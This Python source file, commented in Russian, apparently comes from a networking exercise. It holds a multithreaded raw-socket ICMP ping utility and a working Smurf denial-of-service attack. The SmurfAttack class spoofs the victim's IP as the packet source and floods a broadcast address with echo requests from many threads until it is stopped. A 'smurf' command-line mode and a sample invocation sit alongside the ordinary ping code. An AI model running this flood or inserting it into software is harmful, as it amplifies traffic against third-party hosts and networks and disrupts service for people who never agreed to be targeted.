#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Утилита ping с поддержкой:
- Параллельного пинга нескольких хостов
- Использования MSG_PEEK
- Временных меток в теле пакета
- Smurf-атаки
"""

import os
import socket
import threading
import time
import sys
from icmp_utils import (
    create_icmp_request,
    parse_icmp_response,
    create_ip_header,
    get_icmp_type_message
)


class PingResult:
    """Результат пинга"""

    def __init__(self, host):
        self.host = host
        self.success = False
        self.rtt = None
        self.error = None
        self.src_ip = None


def ping_single_host(host, icmp_id, timeout=2, ttl=64):
    """
    Пинг одного хоста с использованием MSG_PEEK
    Возвращает PingResult
    """
    result = PingResult(host)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(timeout)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)

        # Отправляем запрос с временной меткой
        timestamp = time.time()
        packet = create_icmp_request(icmp_id, 1, timestamp)
        sock.sendto(packet, (host, 1))

        # Получаем ответ с MSG_PEEK
        while True:
            try:
                # Сначала заглядываем в буфер без удаления
                peek_packet, peek_addr = sock.recvfrom(1024, socket.MSG_PEEK)

                # Парсим пакет
                icmp_type, icmp_code, src_ip, rtt, is_ours = parse_icmp_response(peek_packet, icmp_id)

                if is_ours:
                    # Наш пакет - удаляем из буфера
                    sock.recvfrom(1024)

                    if icmp_type == 0:  # Echo Reply
                        result.success = True
                        result.rtt = rtt
                        result.src_ip = src_ip
                    elif icmp_type == 3:  # Destination Unreachable
                        result.error = get_icmp_type_message(icmp_type, icmp_code)
                    else:
                        result.error = get_icmp_type_message(icmp_type, icmp_code)
                    break
                else:
                    # Не наш пакет - удаляем из буфера
                    sock.recvfrom(1024)

            except socket.timeout:
                result.error = "Timeout"
                break

        sock.close()

    except PermissionError:
        result.error = "Permission denied (need sudo)"
    except socket.error as e:
        result.error = f"Socket error: {e}"
    except Exception as e:
        result.error = f"Error: {e}"

    return result


def parallel_ping(hosts, timeout=2):
    """
    Параллельный пинг нескольких хостов
    Каждый поток пингует один хост
    """
    icmp_id = os.getpid() & 0xFFFF
    results = []
    threads = []

    def ping_worker(host):
        result = ping_single_host(host, icmp_id, timeout)
        results.append(result)

    # Запускаем потоки
    for host in hosts:
        thread = threading.Thread(target=ping_worker, args=(host,))
        thread.start()
        threads.append(thread)

    # Ожидаем завершения всех потоков
    for thread in threads:
        thread.join()

    # Выводим результаты
    print("\nРезультаты пинга:")
    print("-" * 60)
    for result in results:
        if result.success:
            print(f"{result.host:20s} - Ответ от {result.src_ip} - RTT: {result.rtt:.2f}ms")
        else:
            print(f"{result.host:20s} - {result.error}")
    print("-" * 60)


# ============= Smurf Attack =============

class SmurfAttack:
    """Класс для выполнения Smurf-атаки"""

    def __init__(self, target_ip, broadcast_ip, num_threads=10):
        self.target_ip = target_ip
        self.broadcast_ip = broadcast_ip
        self.num_threads = num_threads
        self.stop_event = threading.Event()
        self.threads = []
        self.icmp_id = os.getpid() & 0xFFFF

    def _send_smurf_packet(self):
        """Отправка одного Smurf-пакета"""
        try:
            # Создаем сырой сокет
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Создаем IP заголовок с подмененным source
            ip_header = create_ip_header(self.target_ip, self.broadcast_ip, proto=1, ttl=64)

            # Создаем ICMP Echo Request
            timestamp = time.time()
            icmp_packet = create_icmp_request(self.icmp_id, 1, timestamp)

            while not self.stop_event.is_set():
                sock.sendto(ip_header + icmp_packet, (self.broadcast_ip, 1))
                time.sleep(0.01)  # Небольшая задержка для контроля нагрузки

            sock.close()

        except PermissionError:
            print("Ошибка: требуются права суперпользователя (sudo) для Smurf-атаки")
        except Exception as e:
            print(f"Ошибка в потоке Smurf: {e}")

    def start(self):
        """Запуск Smurf-атаки"""
        print(f"Запуск Smurf-атаки:")
        print(f"  Цель (подменяемый источник): {self.target_ip}")
        print(f"  Широковещательный адрес: {self.broadcast_ip}")
        print(f"  Количество потоков: {self.num_threads}")
        print("Нажмите Ctrl+C для остановки...")
        print("-" * 50)

        for _ in range(self.num_threads):
            thread = threading.Thread(target=self._send_smurf_packet)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nОстановка атаки...")
            self.stop()

    def stop(self):
        """Остановка Smurf-атаки"""
        self.stop_event.set()
        for thread in self.threads:
            thread.join(timeout=2)
        print("Атака остановлена")


# ============= Main =============

def print_usage():
    """Вывод справки"""
    print("Использование:")
    print("  ping.py ping <host1> [host2 ...] [-t timeout]")
    print("  ping.py smurf <target_ip> <broadcast_ip> [threads]")
    print("  ping.py help")
    print()
    print("Примеры:")
    print("  sudo python3 ping.py ping 8.8.8.8")
    print("  sudo python3 ping.py ping 8.8.8.8 1.1.1.1 -t 3")
    print("  sudo python3 ping.py smurf 192.168.1.10 192.168.1.255 20")


def main():
    if len(sys.argv) < 2:
        print_usage()
        sys.exit(1)

    command = sys.argv[1].lower()

    if command == "help":
        print_usage()

    elif command == "ping":
        hosts = []
        timeout = 2

        i = 2
        while i < len(sys.argv):
            if sys.argv[i] == "-t" and i + 1 < len(sys.argv):
                timeout = float(sys.argv[i + 1])
                i += 2
            else:
                hosts.append(sys.argv[i])
                i += 1

        if not hosts:
            print("Ошибка: укажите хотя бы один хост для пинга")
            sys.exit(1)

        parallel_ping(hosts, timeout)

    elif command == "smurf":
        if len(sys.argv) < 4:
            print("Ошибка: smurf <target_ip> <broadcast_ip> [threads]")
            sys.exit(1)

        target_ip = sys.argv[2]
        broadcast_ip = sys.argv[3]
        num_threads = int(sys.argv[4]) if len(sys.argv) > 4 else 10

        attack = SmurfAttack(target_ip, broadcast_ip, num_threads)
        attack.start()

    else:
        print(f"Неизвестная команда: {command}")
        print_usage()


if __name__ == "__main__":
    main()